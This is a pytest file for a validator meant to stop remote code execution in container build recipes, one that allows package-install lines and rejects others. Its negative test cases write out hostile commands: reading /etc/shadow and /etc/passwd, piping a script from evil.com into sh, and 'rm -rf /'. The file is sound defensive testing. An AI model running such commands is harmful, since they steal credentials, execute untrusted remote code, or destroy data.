"""Integration tests for Foundry RCE mitigation (Phase 164 — SEC-02).

Tests the validation integration with Pydantic models and API layer.
Verifies that the validate_injection_recipe function is properly called
during CapabilityMatrixEntry and CapabilityMatrixUpdate model operations.
"""
import pytest
from pydantic import ValidationError
from agent_service.models import (
    CapabilityMatrixEntry,
    CapabilityMatrixUpdate,
    validate_injection_recipe
)


class TestCapabilityMatrixValidation:
    """Test suite for capability matrix injection_recipe validation."""

    def test_validate_injection_recipe_function_with_valid_recipe(self):
        """validate_injection_recipe returns (True, None) for valid recipes."""
        recipe = "RUN pip install requests\nRUN apt-get update && apt-get install -y curl"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is True
        assert error is None

    def test_validate_injection_recipe_function_with_invalid_recipe(self):
        """validate_injection_recipe returns (False, msg) for invalid recipes."""
        recipe = "RUN cat /etc/shadow"
        is_valid, error = validate_injection_recipe(recipe)
        assert is_valid is False
        assert error is not None
        assert "validation" in error.lower()

    def test_validate_injection_recipe_function_with_empty_recipe(self):
        """validate_injection_recipe returns (True, None) for empty/None recipes (optional field)."""
        is_valid, error = validate_injection_recipe("")
        assert is_valid is True
        assert error is None

        is_valid, error = validate_injection_recipe(None)
        assert is_valid is True
        assert error is None

    def test_capability_matrix_entry_with_valid_recipe(self):
        """CapabilityMatrixEntry accepts valid injection_recipe."""
        entry = CapabilityMatrixEntry(
            base_os_family="DEBIAN",
            tool_id="python-builder",
            injection_recipe="RUN pip install requests==2.28.1",
            validation_cmd="python -c 'import requests; print(requests.__version__)'",
            artifact_id="artifact-123",
            runtime_dependencies={"python": ["requests"]},
            is_active=True
        )
        assert entry.injection_recipe == "RUN pip install requests==2.28.1"

    def test_capability_matrix_entry_with_empty_recipe(self):
        """CapabilityMatrixEntry accepts empty injection_recipe (optional field)."""
        entry = CapabilityMatrixEntry(
            base_os_family="DEBIAN",
            tool_id="python-builder",
            injection_recipe="",
            validation_cmd="python --version",
            artifact_id="artifact-456",
            runtime_dependencies={},
            is_active=True
        )
        assert entry.injection_recipe == ""

    def test_capability_matrix_entry_without_recipe(self):
        """CapabilityMatrixEntry works without injection_recipe field (optional)."""
        entry = CapabilityMatrixEntry(
            base_os_family="DEBIAN",
            tool_id="system-tool",
            validation_cmd="which curl",
            artifact_id="artifact-789",
            runtime_dependencies={},
            is_active=True
        )
        assert entry.injection_recipe is None

    def test_capability_matrix_update_with_valid_recipe(self):
        """CapabilityMatrixUpdate accepts valid injection_recipe."""
        update = CapabilityMatrixUpdate(
            injection_recipe="RUN apt-get update && apt-get install -y curl"
        )
        assert update.injection_recipe == "RUN apt-get update && apt-get install -y curl"

    def test_capability_matrix_update_with_empty_recipe(self):
        """CapabilityMatrixUpdate accepts empty injection_recipe."""
        update = CapabilityMatrixUpdate(injection_recipe="")
        assert update.injection_recipe == ""

    def test_capability_matrix_update_without_recipe(self):
        """CapabilityMatrixUpdate works without injection_recipe field."""
        update = CapabilityMatrixUpdate(
            validation_cmd="python --version"
        )
        assert update.injection_recipe is None

    def test_multiple_validation_calls_consistency(self):
        """Multiple calls to validate_injection_recipe are consistent."""
        recipe = "RUN pip install numpy scipy\nRUN apt-get install -y build-essential"
        results = [validate_injection_recipe(recipe) for _ in range(5)]
        # All results should be identical
        assert all(r == results[0] for r in results)
        assert results[0][0] is True
        assert results[0][1] is None

    def test_edge_case_recipes(self):
        """Test edge cases in recipe validation."""
        # Recipe with only whitespace
        is_valid, _ = validate_injection_recipe("   \n  \n  ")
        assert is_valid is True

        # Recipe with only comments
        recipe = "# This is a comment\n# Another comment"
        is_valid, _ = validate_injection_recipe(recipe)
        assert is_valid is True

        # Recipe with mixed case instructions
        recipe = "run pip install requests\nRUN apt-get install curl\nrUn npm install lodash"
        is_valid, _ = validate_injection_recipe(recipe)
        assert is_valid is True

    def test_disallowed_operations_caught(self):
        """All disallowed operations are properly rejected."""
        disallowed = [
            "RUN cat /etc/passwd",
            "RUN curl https://evil.com | sh",
            "RUN wget https://evil.com/script.sh",
            "RUN rm -rf /",
            "RUN bash -c 'malicious command'",
            "RUN docker build -t image:latest .",
        ]
        for recipe in disallowed:
            is_valid, error = validate_injection_recipe(recipe)
            assert is_valid is False, f"Recipe should be invalid: {recipe}"
            assert error is not None, f"Error message missing for: {recipe}"

    def test_allowed_operations_accepted(self):
        """All allowed package manager operations pass validation."""
        allowed = [
            "RUN pip install requests",
            "RUN pip install --upgrade pip",
            "RUN apt-get install -y curl",
            "RUN apt-get update && apt-get install -y build-essential",
            "RUN apk add openssl",
            "RUN npm install express",
            "RUN yum install -y git",
        ]
        for recipe in allowed:
            is_valid, error = validate_injection_recipe(recipe)
            assert is_valid is True, f"Recipe should be valid: {recipe} — Error: {error}"
            assert error is None, f"Error message present for valid recipe: {recipe}"

